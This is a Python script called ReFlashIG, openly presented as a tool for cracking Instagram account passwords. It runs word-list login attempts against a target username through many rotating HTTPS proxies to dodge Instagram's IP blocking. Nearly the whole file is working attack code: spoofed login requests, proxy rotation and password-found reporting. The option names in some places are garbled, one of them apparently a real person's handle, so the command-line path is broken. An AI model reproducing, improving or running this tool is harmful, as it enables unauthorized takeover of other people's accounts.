#!/usr/bin/python
# -*- coding: utf-8 -*-
import cgi
import sys
import os
import os.path
import optparse
import itertools
import json
import random
try:
	import urllib2
except ImportError:
	import urllib
import time
import requests
import threading
from datetime import datetime
import datetime as DT

# IG BLOCKS IP AFTER 10 LOGIN ATTEMPTS

# COLORS
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
BL = '\033[30m' # black
UND = '\033[4m' # underline
BLINK = '\033[5m' # blink

# TITLE SKETCH
title_list = []
title = '''
╔════════ ReFlashIG ════════╗
║ ╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗ ║
║ ╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦ ║
║ ╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝ ║
╚═══════════════════════════╝

 Developed By: @the.red.team3
'''

# LOAD SCHEMED TITLES INTO LIST
title_list.append((title).replace('╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦', R + '╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦' + W))
title_list.append((title).replace('╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦', B + '╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦' + W).replace('╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗', C + '╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗' + W).replace('╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝', C + '╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝' + W))
title_list.append((title).replace('╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦', P + '╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦' + W).replace('╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗', C + '╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗' + W).replace('╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝', C + '╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝' + W))
title_list.append((title).replace('╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦', R + '╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦' + W).replace('╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗', O + '╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗' + W).replace('╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝', O + '╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝' + W))
title_list.append((title).replace('╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦', O + '╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦' + W).replace('╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗', T + '╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗' + W).replace('╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝', R + '╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝' + W))
title_list.append((title).replace('╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦', B + '╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦' + W).replace('╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗', C + '╦═╗┌─┐╔═╗┬  ┌─┐┌─┐┬ ┬╦╔═╗' + W).replace('╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝', P + '╩╚═└─┘╚  ┴─┘┴ ┴└─┘┴ ┴╩╚═╝' + W))
title_list.append((title).replace('╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦', G + '╠╦╝├┤ ╠╣ │  ├─┤└─┐├─┤║║ ╦' + W))

print(random.SystemRandom().choice(title_list))

# USAGE
usage = 'give me the formuoli'

# SOME GLOBAL VARIABLES
global verbose_bool
global active_threads
global all_threads
global thread_count
global https_proxies
global ig_timeout
global password_count

all_threads = 0
active_threads = 0
verbose_bool = False


# COMMAND LINE ARGUMENTS
parser = optparse.OptionParser(G + '%prog [-i] [-m] [-v] [-c <thread count>] -u <username> -p <password file> -x <proxy file> -t <timeout>' + W)
parser.add_option('-u', dest='ishitavarundhawan', type='string', help='Instagram username to target')
parser.add_option('-p', dest='my files', type='string', help='File containing list of passwords')
parser.add_option('-x', dest='proxy', type='string', help='File containing list of proxies')
parser.add_option('-t', dest='timeout', type='int', help='Instagram connection timeout')
parser.add_option('-c', dest='thread_count', type='int', help='Thread count')
parser.add_option('-v', action='store_true', dest='verbose', default=False, help='Verbose output')
parser.add_option('-m', action='store_true', dest='menu', default=False, help='Open interactive menu')
parser.add_option('-i', action='store_true', dest='information', default=False, help='Information page')

(options, args) = parser.parse_args()


# OPTION CHECK AND VARIABLE/LIST PREP
if ((options.timeout == None) or (options.proxy == None) or (options.password_file == None) or (options.username == None)) and ((options.menu == False) and (options.information == False)):
	print(R + '[INFO] Check usage (-h)' + W)
	sys.exit()
else:
	try:
		https_proxies = []
		timeout_proxies = []
		failed_proxies = []
		blocked_proxies = []
		thread_count = options.thread_count
		ig_timeout = int(options.timeout)
	except:
		probably_menu = True


# CLASS TO STORE USER CREDS
class User:
	username = ''
	password = ''


# URLS FOR VARIOUS FUNCTIONS
url = 'https://www.instagram.com/'
url_login = 'https://www.instagram.com/accounts/login/ajax/'
url_logout = 'https://www.instagram.com/accounts/logout/'

user_agent = ("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 "
				  "(KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36")
accept_language = 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4'




# END OF GROSS LOOKING INTRO CRAP




# FUNCTION FOR OUTPUT IF VERBOSE MODE IS ON
def show_output(output):
	global verbose_bool
	if options.verbose or verbose_bool:
		print(output)

# FUNCTION FOR MATHING
def math_and_shit(p_count, x_count):
	divis = 20 # MUTIPLIER PROVIDED BY @wr3tched, THANKS CRAIG
	max_attempts = x_count * divis
	if p_count < max_attempts:
		show_output(G + '[INFO] You have enough proxies to attempt every password' + W)
		show_output(G + '[INFO] Maximum attempts possible: ' + str(max_attempts) + W)
	if p_count > max_attempts:
		show_output(R + '[INFO] Insufficient list of proxies to attempt all passwords' + W)
		show_output(R + '[INFO] Instagram will block all of your proxies before each password can be attempted' + W)
		show_output(R + '[INFO] Maximum attempts possible: ' + str(max_attempts) + W)
		show_output(R + '[INFO] Additional proxies needed: ' + str(int(abs((max_attempts - p_count) / divis))) + W)
	
# FUNCTION TO LOAD PROXIES
def load_proxies(list_file):
	with open(str(list_file)) as p:
		from_file = p.readlines()

	for p_item in from_file:
		if p_item not in https_proxies:
			https_proxies.append(str(p_item).replace('\n', ''))

	print(G + '[INFO]   Proxies loaded: ' + str(len(https_proxies)) + W)


# FUNCTION TO LOGIN AND GATHER INFO
def login(obj, https_prox):
	global ig_timeout
	https_proxy = 'https://' + str(https_prox)
	proxy = {"https" : https_proxy}

	# ESTABLISH REQUEST SESISON
	s = requests.Session()
	s.cookies.update({
		'sessionid': '',
		'mid': '',
		'ig_pr': '1',
		'ig_vw': '1920',
		'csrftoken': '',
		's_network': '',
		'ds_user_id': ''
	})
	login_post = {
		'username': obj.username,
		'password': obj.password
	}
	s.headers.update({
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': accept_language,
#		'Connection': 'keep-alive', # UNCOMMENT IF YOU WANT TO LIVE IN SIN
		'Content-Length': '0',
		'Host': 'www.instagram.com',
		'Origin': 'https://www.instagram.com',
		'Referer': 'https://www.instagram.com/',
		'User-Agent': user_agent,
		'X-Instagram-AJAX': '1',
		'X-Requested-With': 'XMLHttpRequest'
	})
	
	# ACTUALLY LOGIN HERE
	
	try:
		r = s.get(url, proxies=proxy, timeout=ig_timeout, allow_redirects=False)
	except requests.exceptions.Timeout as e:
		if proxy not in timeout_proxies:
			timeout_proxies.append(proxy)
		this_shit_be_a_timeout = True

	s.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
	time.sleep(5 * random.random())
	
	# SWITCH COMMENTS IF YOU WANT TO LIVE IN NORTH KOREA
#	login = s.post(url_login, data=login_post, allow_redirects=True, proxies=proxy, timeout=ig_timeout)
	login = s.post(url_login, data=login_post, allow_redirects=False, proxies=proxy, timeout=ig_timeout)
		
	s.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
	csrftoken = login.cookies['csrftoken']
	time.sleep(5 * random.random())

	# DETERMINE WHETHER OR NOT IT WAS SUCCESSFUL
	if login.status_code == 200:
		r = s.get('https://www.instagram.com/', proxies=proxy)
		finder = r.text.find(obj.username)
		if finder != -1:
			login_status = True
		# BAD LOGIN CREDS
		else:
			return False, s, csrftoken, login.status_code, login.text, https_proxy			
	else:
		return False, s, csrftoken, login.status_code, login.text, https_proxy		
	return True, s, csrftoken, login.status_code, login.text, https_proxy
	# I LIKE TO ADD THE SAME RETURN STATEMENT AT LEAST TWICE
	# SO WHEN I LOOK BACK AT MY CODE, I CAN BE LIKE, "wtf"
	

# FUNCTION TO LOGOUT ONCE THE WORK IS DONE
def logout(obj, s, csrftoken):
	try:
		logout_post = {'csrfmiddlewaretoken': csrftoken}
		logout = s.post(url_logout, data=logout_post)
		login_status = False
	except:
		loggingout = False
		

# FUNCTION TO TELL THE USER THERE WAS AN ERROR WHILE LOGGING THEM IN
def no_good(code, login_text, password, proxy_used):
	global active_threads
	global font_change
	if 'checkpoint_required' not in str(login_text):
		entr = proxy_used.replace('https://', '')
		try:
			https_proxies.remove(entr)
		except:
			prob_removed = True
		if entr not in blocked_proxies:
			blocked_proxies.append(entr)
		p_statement = R + '[INFO] This IP has been blocked by Instagram | proxy: ' + str(proxy_used) + ' | password: ' + str(password) + W
		show_output(p_statement)
		return False
	elif 'checkpoint_required' in str(login_text):
		print(G + '[INFO]   Password Found: ' + str(password) + ' | proxy: ' + str(proxy_used) + W)
		print(O + '[INFO] Suspicious login flagged by Instagram' + W)
		active_threads = 0
		sys.exit()
		return True
		
		
# FUNCTION TO PROCESS PASSWORD CRACKING TASKS AND RESULTS
def processor(username, passw, all_count):
	# KEEP TRACK OF HOW MANY THREADS ARE RUNNING
	global active_threads
	global all_threads
	global password_count
	active_threads = active_threads + 1
	
	# BUILD A LOCAL LIST OF PROXIES
	global https_proxies
	
	do_break = False
	
	# LOOP UNTIL EITHER AN INCORRECT PASSWORD OR CORRECT PASSWORD IS FOUND
	# DON'T BREAK LOOP IF A BAD PROXY IS USED
	while do_break == False:
	
		# PICK RANDOM PROXY FROM LIST AND USE IT

		# JK, YOU FILTHY ANIMAL	

		# SELECT NEXT PROXY IN LINE IF NOT BLOCKED

		# JUST JK-ing, WE ARE PICKING AT RANDOM
		while 1:
			if len(https_proxies) > 1:
				the_proxy = random.SystemRandom().choice(https_proxies)
				if the_proxy not in blocked_proxies:
					break
				time.sleep(0.1)
			else:
				the_proxy = https_proxies[0]
				do_break = True
				break

		# SETUP USER OBJECT
		password = passw.replace('\n', '')
		user_obj = User()
		user_obj.username = str(username)
		user_obj.password = str(password)
		
		# MAKE A LOGIN ATTEMPT
		try:
			the_bool, the_session, the_token, status_code, login_text, proxy_used = login(user_obj, the_proxy)
		except:
			if the_proxy not in failed_proxies:
				failed_proxies.append(the_proxy)
			continue
			
		# CHECK IF LOGIN CREDS ARE GOOD
		if the_bool == False and str(status_code) == '200':
			all_threads = all_threads + 1
			p_statement = R + '->             Tried: ' + str(password) + ' | proxy: ' + str(proxy_used) + ' | ' + str(active_threads) + '/' + str(all_threads) + '/' + str(password_count) + W + ' > ' + str(len(https_proxies))
			show_output(p_statement)
			do_break = True
			break
		elif the_bool == False and str(status_code) != '200':
			if no_good(status_code, login_text, password, proxy_used):
				do_break = True
				break
			else:
				do_break = False
		else:
			print(G + '[INFO]   Password Found: ' + str(password) + ' | proxy: ' + str(proxy_used) + W)
			logout(user_obj, the_session, the_token)
			do_break = True
			active_threads = 0
			break
		
	active_threads = active_threads - 1
	

		
# FUNCTION TO FIRE OFF THREADS AND PREPARE LISTS
def fire_jobs(username, pass_file, x):
	global password_count
	global thread_count
	global active_threads
	all_count = 1
	show_output(G + '[INFO] Verbose output ON' + W)
	if (username != None) and (pass_file != None):

		# LOAD PASSWORDS
		with open(pass_file) as f:
			passwords = f.readlines()
			
		print(G + '[INFO] Passwords loaded: ' + str(len(passwords)) + W)
		password_count = len(passwords)


		math_and_shit(len(passwords), x)		

		local_thread_count = 0

		# GIVE EACH PASSWORD ITS OWN THREAD
		for passw in passwords:
			if thread_count != None:
				if active_threads >= thread_count:
					local_thread_count = 0
				while active_threads >= thread_count:
					time.sleep(0.1)
			t = threading.Thread(target=processor, args=(username, passw, all_count,))
			t.daemon=True
			t.start()
			all_count = all_count + 1
			local_thread_count = local_thread_count + 1
			


		try:
			while active_threads > 0:
				time.sleep(0.1)
		except KeyboardInterrupt:
			sys.exit()
			

		# RESULTS SHOWN HERE
		print(G + '[INFO]   Failed proxies: ' + str(len(failed_proxies)) + W)
		print(G + '[INFO]  Timeout proxies: ' + str(len(timeout_proxies)) + W)
		print(G + '[INFO]  Blocked proxies: ' + str(len(blocked_proxies)) + W)
		print(G + '[INFO] Complete' + W)
		sys.exit()


# BRANCH FOR MENU OR SWITCHES
# USING SWITCH OPTIONS
if options.menu == False and options.information == False:
	try:
		username = options.username
		pass_file = options.password_file
		
		# LOAD CLEAN LIST OF PROXIES
		load_proxies(str(options.proxy))
		fire_jobs(username, pass_file, len(https_proxies))
	except:
		print(usage)
		sys.exit()

# INFORMATION PAGE
elif options.information == True:
	print('''

ReFlashIG: Developed for the purpose of determining Instagram account passwords through word list attacks.

This tools requires a substantial list of HTTPS proxies to avoid IP blacklisting on Instagram.
Be sure to load and test proxies so you can use them with this tool.
''')
	sys.exit()

# INTERACTIVE MENU
else:

	# DON'T WORRY. I CHECK ALL OF YOUR INPUT BECAUSE IT WILL PROBABLY BE TRASH
	try:
		username = raw_input('Enter target Instagram username -> ')

		# LOOP UNTIL USER PROVIDES VALID PASSWORD FILE
		valid = False
		while valid == False:
			password = raw_input('Enter password list file -> ')
			if os.path.isfile(str(password)):
				valid = True
			else:
				print(R + '[INFO] ' + str(password) + ' does not exist' + W)

		# LOOP UNTIL USER PROVIDES VALID PROXY FILE
		valid = False
		while valid == False:
			proxies = raw_input('Enter proxy list file -> ')
			if os.path.isfile(str(proxies)):
				valid = True
			else:
				print(R + '[INFO] ' + str(proxies) + ' does not exist' + W)
	
		# LOOP UNTIL USE PROVIDES VALID TIMEOUT VALUE
		# USER*
		valid = False
		while valid == False:
			timeout = raw_input('Enter Instagram connection timeout(sec) -> ')
			try:
				ig_timeout = int(timeout)
				valid = True
			except:
				valid = False
				print(R + '[INFO] ' + str(timeout) + ' is not a valid timeout value' + W)

		# LOOP UNTIL USER PROVIDES VALID THREAD COUNT VALUE OR SKIPS FOR DEFAULT VALUE
		valid = False
		while valid == False:
			tc = raw_input('Enter the amount of threads allowed to run at once(skip for limitless) -> ')
			try:
				if str(tc) != '':
					thread_count = int(tc)
				valid = True
			except:
				print(R + '[INFO] ' + str(tc) + ' is not a valid thread count value' + W)
				
		valid = False
		while valid == False:
			do_verbose = raw_input('Would you like verbose output?(y or n) -> ')
			try:
				if (str(do_verbose) == 'y') or (str(do_verbose) == 'Y'):
					verbose_bool = True
					valid = True
				else:
					valid = True
			except:
				print(R + '[INFO] ' + str(do_verbose) + ' is not a valid option'+ W)
				
	except KeyboardInterrupt:
		print('\n')
		sys.exit()

	
	# LOAD CLEAN LIST OF PROXIES
	load_proxies(proxies)

	# FIRE OFF ALL OF THE PASSWORD CRACKING THREADS
	fire_jobs(username.replace('\n', ''), password, len(https_proxies))


# POP BOTTLES
